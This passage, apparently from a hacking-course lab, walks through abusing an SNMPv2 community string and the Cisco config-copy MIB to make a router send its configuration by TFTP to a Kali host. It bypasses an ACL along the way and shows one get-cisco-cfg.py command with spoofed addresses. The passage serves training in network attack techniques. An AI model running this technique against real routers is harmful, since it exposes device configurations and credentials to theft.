...
Using the discovered SNMPv2 community string and the [Cisco-Config-Copy-MIB](http://tools.cisco.com/Support/SNMP/do/BrowseMIB.do?local=en&mibName=CISCO-CONFIG-COPY-MIB), make the router upload its configuration via TFTP to **kali.pod.becomingahacker.com**. The uploaded configuration should be placed in `/srv/tftp`. A tool using [Scapy](http://www.secdev.org/projects/scapy/doc/) is provided to help you with this. ( `~/becoming-a-hacker/networking/get-cisco-cfg.py` ) An access control list (ACL) configured on the router is blocking you--**bypass it!**

Before moving on, disable the systemd tftp service and run tftp manually by executing these commands:
...
root@kali-0:~/becoming-a-hacker/networking# ./get-cisco-cfg.py -i eth0 -s 10.1.1.4 -d 10.1.1.1 -t 10.1.2.2 -f my-config -c 
WARNING: No route found for IPv6 destination :: (no default route?)
